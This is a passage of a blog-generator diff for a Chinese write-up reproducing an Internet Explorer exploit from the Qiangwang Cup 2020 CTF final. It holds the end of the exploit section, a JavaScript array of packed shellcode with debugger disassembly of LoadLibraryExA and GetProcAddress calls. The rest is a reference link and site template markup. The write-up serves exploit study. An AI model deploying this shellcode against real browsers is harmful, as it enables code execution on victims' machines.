class="comment">// 05edc62c ff954cffffff    call    dword ptr [ebp-0B4h] ss:002b:05edc484=&#123;KERNEL32!LoadLibraryExAStub (76041580)&#125;</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// 05edc632 90              nop</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// 05edc633 68b4019c0b      push    0B9C01B4h</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// 05edc633 68b4019c0b      push    0B9C01B4h</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// 05edc638 50              push    eax</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// 05edc639 ff9544ffffff    call    dword ptr [ebp-0BCh] ss:002b:05edc47c=&#123;IEShims!NS_GetProcAddressShim::APIHook_GetProcAddress (6b5f4480)&#125;</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// 05edc63f 68bc019c0b      push    0B9C01BCh</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// 05edc644 ffd0            call    eax</span></span></span><br><span class="line"></span><br><span class="line">		0x68909090,</span><br><span class="line">		packInt(strs_base+0x10),</span><br><span class="line">		packInt(0x85c79050),</span><br><span class="line">		packInt(0xffffff44),</span><br><span class="line">		packInt(GetProcAddress_addr),</span><br><span class="line">		packInt(0xff4495ff),</span><br><span class="line">		packInt(0x8589ffff),</span><br><span class="line">		packInt(0xffffff40),</span><br><span class="line">		0x68909090,</span><br><span class="line">		packInt(strs_base+0x20),</span><br><span class="line">		packInt(0xff48b5ff),</span><br><span class="line">		packInt(0x95ffffff),</span><br><span class="line">		packInt(0xffffff44),</span><br><span class="line">		packInt(0xff3c8589),</span><br><span class="line">		0x6890ffff,</span><br><span class="line">		packInt(strs_base+0x30),</span><br><span class="line">		packInt(0xff48b5ff),</span><br><span class="line">		packInt(0x95ffffff),</span><br><span class="line">		packInt(0xffffff44),</span><br><span class="line">		packInt(0xff388589),</span><br><span class="line">		packInt(0x858dffff),</span><br><span class="line">		packInt(0xffffff34),</span><br><span class="line">		0x66850,</span><br><span class="line">		0x6a0002,</span><br><span class="line">		0x68909090,</span><br><span class="line">		packInt(base),</span><br><span class="line">		0x168,</span><br><span class="line">		0x4095ff80,</span><br><span class="line">		0x6affffff,</span><br><span class="line">		packInt(0xfc458d04),</span><br><span class="line">		0x6a046a50,</span><br><span class="line">		0x50858d00,</span><br><span class="line">		0x50ffffff,</span><br><span class="line">		packInt(0xff34b5ff),</span><br><span class="line">		packInt(0x95ffffff),</span><br><span class="line">		packInt(0xffffff3c),</span><br><span class="line">		packInt(0xff34b5ff),</span><br><span class="line">		packInt(0x95ffffff),</span><br><span class="line">		packInt(0xffffff38),</span><br><span class="line">		0x80068,</span><br><span class="line">		0x68006a00,</span><br><span class="line">		packInt(strs_base),</span><br><span class="line">		packInt(0xff4c95ff),</span><br><span class="line">		0x6890ffff,</span><br><span class="line">		packInt(strs_base+0x3C),</span><br><span class="line">		0x4495ff50,</span><br><span class="line">		0x68ffffff,</span><br><span class="line">		packInt(strs_base+0x44),</span><br><span class="line">		0xD0FF);</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-        <div class="article-info info-on-right">
-          
-          
 
+
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>强网杯2020决赛RealWord的IE浏览器漏洞挖掘-PiAno(PA) <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/222678">https://www.anquanke.com/post/id/222678</a></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2021/04/12/%E5%BC%BA%E7%BD%91%E6%9D%AF2020_RealWorld_PiAno%E5%A4%8D%E7%8E%B0/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/04/10/%E5%BC%BA%E7%BD%91%E6%9D%AF2020_RealWorld_ADoBe%E5%A4%8D%E7%8E%B0/" class="archive-article-date">
-  	<time datetime="2021-04-10T02:34:11.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-10</time>
-</a>
+<nav id="article-nav">
+  
+    <a href="/2021/04/12/v8%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          v8 环境搭建
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2021/04/10/%E5%BC%BA%E7%BD%91%E6%9D%AF2020_RealWorld_ADoBe%E5%A4%8D%E7%8E%B0/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">强网杯2020_RealWorld_ADoBe复现</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/04/10/%E5%BC%BA%E7%BD%91%E6%9D%AF2020_RealWorld_ADoBe%E5%A4%8D%E7%8E%B0/">强网杯2020_RealWorld_ADoBe复现</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B8%A9%E5%9D%91"><span class="toc-number">1.</span> <span class="toc-text">踩坑</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">2.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">3.</span> <span class="toc-text">参考链接</span></a></li></ol>
+                    </div>
+                </span>
+            </div>
         </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
+        
+    </div>
+</aside>
+
+
+
   
   
-    </div></section>
   
 
-    
+  
+
+  
+
+  
 
 
           </div>
@@ -255,8 +332,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
